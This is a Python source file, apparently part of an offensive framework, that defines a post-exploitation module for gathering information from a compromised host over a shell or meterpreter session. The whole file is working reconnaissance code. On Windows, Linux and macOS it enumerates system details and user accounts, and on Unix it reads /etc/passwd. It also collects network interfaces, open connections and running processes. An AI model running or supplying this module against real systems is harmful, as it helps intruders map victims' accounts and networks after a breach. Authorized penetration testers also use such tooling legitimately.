"""
System Information Post-Exploitation Module
Gathers system information from compromised host.
"""

import asyncio
from ..templates.base_post_exploit import BasePostExploit

class SystemInfo(BasePostExploit):
    """Gather system information from compromised host."""
    
    name = "System Information Gatherer"
    description = "Collect detailed system information from target"
    author = "CypherFramework Team"
    version = "1.0"
    
    platforms = ["windows", "linux", "macos"]
    session_types = ["shell", "meterpreter"]
    
    def _default_options(self):
        return {
            'SESSION': {'value': '', 'required': True, 'description': 'Session ID'},
            'GATHER_USERS': {'value': True, 'required': False, 'description': 'Gather user information'},
            'GATHER_NETWORK': {'value': True, 'required': False, 'description': 'Gather network information'},
            'GATHER_PROCESSES': {'value': True, 'required': False, 'description': 'Gather process information'},
        }
        
    def _required_options(self):
        return ['SESSION']
        
    async def run(self, session):
        """Execute system information gathering."""
        gather_users = self.get_option('GATHER_USERS')
        gather_network = self.get_option('GATHER_NETWORK')
        gather_processes = self.get_option('GATHER_PROCESSES')
        
        results = {
            'success': True,
            'system_info': {},
            'users': [],
            'network': {},
            'processes': []
        }
        
        # Detect platform
        platform = await self._detect_platform(session)
        results['system_info']['platform'] = platform
        
        # Gather basic system info
        if platform == 'windows':
            results['system_info'].update(await self._gather_windows_info(session))
        elif platform == 'linux':
            results['system_info'].update(await self._gather_linux_info(session))
        elif platform == 'macos':
            results['system_info'].update(await self._gather_macos_info(session))
            
        # Gather users if requested
        if gather_users:
            if platform == 'windows':
                results['users'] = await self._gather_windows_users(session)
            else:
                results['users'] = await self._gather_unix_users(session)
                
        # Gather network info if requested
        if gather_network:
            results['network'] = await self._gather_network_info(session, platform)
            
        # Gather processes if requested
        if gather_processes:
            results['processes'] = await self._gather_processes(session, platform)
            
        return results
        
    async def _detect_platform(self, session):
        """Detect target platform."""
        # Try Windows commands first
        result = await self._execute_command(session, 'ver')
        if 'Windows' in result:
            return 'windows'
            
        # Try Unix commands
        result = await self._execute_command(session, 'uname -s')
        if 'Linux' in result:
            return 'linux'
        elif 'Darwin' in result:
            return 'macos'
            
        return 'unknown'
        
    async def _gather_windows_info(self, session):
        """Gather Windows system information."""
        info = {}
        
        # System info
        result = await self._execute_command(session, 'systeminfo')
        if result:
            lines = result.split('\n')
            for line in lines:
                if ':' in line:
                    key, value = line.split(':', 1)
                    info[key.strip()] = value.strip()
                    
        # Computer name
        result = await self._execute_command(session, 'echo %COMPUTERNAME%')
        if result:
            info['computer_name'] = result.strip()
            
        # Current user
        result = await self._execute_command(session, 'whoami')
        if result:
            info['current_user'] = result.strip()
            
        return info
        
    async def _gather_linux_info(self, session):
        """Gather Linux system information."""
        info = {}
        
        # System info
        commands = {
            'hostname': 'hostname',
            'kernel': 'uname -r',
            'architecture': 'uname -m',
            'distribution': 'cat /etc/os-release | grep PRETTY_NAME',
            'uptime': 'uptime',
            'current_user': 'whoami',
            'user_id': 'id'
        }
        
        for key, command in commands.items():
            result = await self._execute_command(session, command)
            if result:
                info[key] = result.strip()
                
        return info
        
    async def _gather_macos_info(self, session):
        """Gather macOS system information."""
        info = {}
        
        commands = {
            'hostname': 'hostname',
            'kernel': 'uname -r',
            'version': 'sw_vers -productVersion',
            'build': 'sw_vers -buildVersion',
            'current_user': 'whoami',
            'hardware': 'system_profiler SPHardwareDataType | grep "Model Name"'
        }
        
        for key, command in commands.items():
            result = await self._execute_command(session, command)
            if result:
                info[key] = result.strip()
                
        return info
        
    async def _gather_windows_users(self, session):
        """Gather Windows user information."""
        users = []
        
        result = await self._execute_command(session, 'net user')
        if result:
            lines = result.split('\n')
            for line in lines:
                if line.strip() and not line.startswith('User accounts'):
                    # Extract usernames (simplified)
                    words = line.split()
                    for word in words:
                        if word and not word.startswith('-'):
                            users.append({'username': word, 'type': 'local'})
                            
        return users
        
    async def _gather_unix_users(self, session):
        """Gather Unix user information."""
        users = []
        
        result = await self._execute_command(session, 'cat /etc/passwd')
        if result:
            lines = result.split('\n')
            for line in lines:
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) >= 7:
                        users.append({
                            'username': parts[0],
                            'uid': parts[2],
                            'gid': parts[3],
                            'home': parts[5],
                            'shell': parts[6]
                        })
                        
        return users
        
    async def _gather_network_info(self, session, platform):
        """Gather network configuration."""
        network = {}
        
        if platform == 'windows':
            result = await self._execute_command(session, 'ipconfig /all')
            if result:
                network['interfaces'] = result
                
            result = await self._execute_command(session, 'netstat -an')
            if result:
                network['connections'] = result
                
        else:
            result = await self._execute_command(session, 'ifconfig -a')
            if not result:
                result = await self._execute_command(session, 'ip addr show')
            if result:
                network['interfaces'] = result
                
            result = await self._execute_command(session, 'netstat -tuln')
            if result:
                network['connections'] = result
                
        return network
        
    async def _gather_processes(self, session, platform):
        """Gather running processes."""
        processes = []
        
        if platform == 'windows':
            result = await self._execute_command(session, 'tasklist /v')
        else:
            result = await self._execute_command(session, 'ps aux')
            
        if result:
            lines = result.split('\n')
            for line in lines[1:]:  # Skip header
                if line.strip():
                    processes.append(line.strip())
                    
        return processes